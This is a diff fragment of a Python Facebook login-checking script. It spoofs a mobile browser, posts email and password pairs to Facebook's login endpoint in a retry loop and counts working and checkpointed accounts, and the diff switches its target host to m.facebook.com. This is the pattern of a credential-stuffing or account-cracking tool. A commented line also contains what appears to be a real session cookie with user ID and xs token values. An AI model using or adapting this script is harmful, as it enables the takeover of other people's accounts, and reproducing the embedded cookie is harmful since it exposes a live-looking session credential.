@@ -16,7 +16,7 @@ def c(e,p):
     print(f"\033[1;32mCHECKED-{n} |CP-{cp} | OK-{ok} [{e}-{p}]\033[0m",end="\r")
     s=r.Session()
     s.headers.update({'User-Agent':'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5'})
-    fb=s.get("https://free.facebook.com")
+    fb=s.get("https://m.facebook.com")
     c1=";".join(k+"="+v for k,v in dict(s.cookies).items())
     #print(s.headers)
     #print(c1)
@@ -24,7 +24,7 @@ def c(e,p):
         'user-agent':'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5'
     }
     s.headers.update(hd1)
-    rt=s.get("https://free.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8")
+    rt=s.get("https://m.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8")
     rs=rt.text
     open("/sdcard/e.html","w").write(rs)
     #print(rt)
@@ -41,7 +41,7 @@ def c(e,p):
            "login":"Log In"
           }
     hd={
-"authority": "free.facebook.com",
+"authority": "m.facebook.com",
 "method": "POST",
 #"path": "/?tbua=1",
 "scheme": "https",
@@ -50,7 +50,7 @@ def c(e,p):
 "accept-language": "en-US,en;q=0.9",
 "cache-control": "max-age=0",
 #cookie: sb=ZZSmY3MeGBoUQGwRYUyxoK8S; datr=ZZSmYxVfXZE4d7ZeITyN1zZn; c_user=100088418937096; xs=33%3AJzMFYMhAzYX4jg%3A2%3A1671861496%3A-1%3A-1; fr=00aIcvweHilBtCkt0.AWVfy_UWaaZSxYEBpHqAs3leHj4.BjppRl.aS.AAA.0.0.BjppT6.AWXrK0CmeIw; presence=C%7B%22t3%22%3A%5B%5D%2C%22utc3%22%3A1671861507032%2C%22v%22%3A1%7D; m_page_voice=100088418937096; m_pixel_ratio=1; wd=971x620
-"referer": "https://free.facebook.com/",
+"referer": "https://m.facebook.com/",
 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Microsoft Edge";v="108"',
 "sec-ch-ua-mobile": "?0",
 'sec-ch-ua-platform': '"Windows"',
@@ -66,7 +66,7 @@ def c(e,p):
 
         while True:
             try:
-                x=s.post("https://free.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8",data=d,headers=hd
+                x=s.post("https://m.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8",data=d,headers=hd
               
                 ).text
                 #print(x)
